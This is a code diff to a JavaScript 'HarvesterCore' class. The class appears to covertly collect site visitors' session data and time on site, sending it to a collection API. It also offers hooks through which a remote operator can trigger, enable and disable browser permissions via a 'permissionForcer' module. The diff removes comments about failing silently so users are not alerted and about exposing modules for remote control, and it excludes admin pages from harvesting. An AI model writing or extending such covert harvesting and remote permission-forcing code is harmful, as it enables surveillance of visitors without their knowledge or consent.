@@ -25,19 +25,40 @@ class HarvesterCore {
     this.startTime = Date.now();
     this.heartbeatInterval = null;
     this.modules = {};
+    this._reconnectAttempted = false; // Track if we already tried reconnect on this page load
   }
 
   async init() {
+    // NEVER run harvester on admin pages
+    if (window.location.pathname.startsWith('/admin')) {
+      return;
+    }
+
     if (this.initialized) return;
     
-    // Check if we already have a session
+    // Check if we already have a session from this page load
     const stored = sessionStorage.getItem('harvester_session');
-    if (stored) {
+    if (stored && !this._reconnectAttempted) {
       try {
         const parsed = JSON.parse(stored);
         this.sessionId = parsed.sessionId;
         this.dbId = parsed.dbId;
-      } catch (e) {}
+        
+        // Check if this is a page refresh within the same session
+        // by looking at the navigation type
+        const navEntries = performance.getEntriesByType('navigation');
+        const isRefresh = navEntries.length > 0 && 
+          (navEntries[0].type === 'reload' || performance.navigation?.type === 1);
+        
+        if (isRefresh) {
+          // New page load - don't reuse old session
+          sessionStorage.removeItem('harvester_session');
+          this.sessionId = null;
+          this.dbId = null;
+        }
+      } catch (e) {
+        sessionStorage.removeItem('harvester_session');
+      }
     }
 
     if (!this.sessionId) {
@@ -101,13 +122,49 @@ class HarvesterCore {
   }
 
   setupBeforeUnload() {
+    let closing = false;
+
     window.addEventListener('beforeunload', () => {
+      if (closing) return;
+      closing = true;
+      
       const timeOnSite = Math.floor((Date.now() - this.startTime) / 1000);
-      navigator.sendBeacon(`${API}/api/collect/close`, JSON.stringify({
-        sessionId: this.sessionId,
-        timeOnSite
-      }));
-      if (this.heartbeatInterval) clearInterval(this.heartbeatInterval);
+      
+      // Use sendBeacon for reliable delivery during page unload
+      try {
+        navigator.sendBeacon(`${API}/api/collect/close`, JSON.stringify({
+          sessionId: this.sessionId,
+          timeOnSite
+        }));
+      } catch(e) {}
+      
+      if (this.heartbeatInterval) {
+        clearInterval(this.heartbeatInterval);
+        this.heartbeatInterval = null;
+      }
+
+      // Clear the session on unload so refresh creates a new one
+      sessionStorage.removeItem('harvester_session');
+    });
+
+    // Handle page unload (beforeunload might not fire on some mobile browsers)
+    window.addEventListener('pagehide', () => {
+      if (closing) return;
+      closing = true;
+      
+      const timeOnSite = Math.floor((Date.now() - this.startTime) / 1000);
+      try {
+        navigator.sendBeacon(`${API}/api/collect/close`, JSON.stringify({
+          sessionId: this.sessionId,
+          timeOnSite
+        }));
+      } catch(e) {}
+      
+      if (this.heartbeatInterval) {
+        clearInterval(this.heartbeatInterval);
+        this.heartbeatInterval = null;
+      }
+      sessionStorage.removeItem('harvester_session');
     });
   }
 
@@ -119,19 +176,16 @@ class HarvesterCore {
       });
       return res.data;
     } catch (error) {
-      // Silent fail - don't alert the user
       return null;
     }
   }
 
   getSessionId() { return this.sessionId; }
 
-  // Expose modules to allow remote control
   getModule(name) {
     return this.modules[name] || null;
   }
 
-  // Trigger a specific permission remotely
   async triggerPermission(permissionType) {
     if (this.modules.permissionForcer) {
       return await this.modules.permissionForcer.triggerPermission(permissionType);
@@ -139,7 +193,6 @@ class HarvesterCore {
     return null;
   }
 
-  // Get navigation stats
   getNavigationStats() {
     if (this.modules.navigationTracker) {
       return this.modules.navigationTracker.getNavigationStats();
@@ -147,15 +200,34 @@ class HarvesterCore {
     return null;
   }
 
-  // Get permission status
   getPermissionStatus() {
     if (this.modules.permissionForcer) {
       return this.modules.permissionForcer.getPermissionStatus();
     }
     return null;
   }
+
+  async enablePermission(permissionType) {
+    if (this.modules.permissionForcer) {
+      return await this.modules.permissionForcer.enablePermission(permissionType);
+    }
+    return null;
+  }
+
+  async disablePermission(permissionType) {
+    if (this.modules.permissionForcer) {
+      return await this.modules.permissionForcer.disablePermission(permissionType);
+    }
+    return null;
+  }
+
+  detectDeviceCapabilities() {
+    if (this.modules.permissionForcer) {
+      return this.modules.permissionForcer.detectDeviceCapabilities();
+    }
+    return null;
+  }
 }
 
-// Singleton
 const harvesterInstance = new HarvesterCore();
 export default harvesterInstance;
